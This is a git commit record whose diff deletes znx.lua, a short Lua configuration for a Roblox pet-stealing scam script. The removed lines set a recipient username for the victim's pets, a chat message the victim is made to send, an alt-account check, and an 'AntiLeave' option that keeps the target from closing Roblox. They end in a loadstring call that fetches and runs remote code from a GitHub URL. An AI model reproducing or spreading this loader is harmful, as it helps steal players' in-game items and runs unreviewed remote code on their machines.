1ca4434d6149b6d31259e7d793d0df0ca66a9ce1
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-23 18:51:21 +0500

    Delete znx.lua

--- znx.lua
+++
@@ -1,8 +0,0 @@
-
-_G.Username = "asdasdas" --// Username To Send Pets To
-_G.GiftMessage = "asdasdsa" --// Message For The Gift To Say
-_G.SendMessage = "asdasd" --// Message the victim will send in the chat on execution
-_G.Diamonds = 111 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/znx.lua"))()
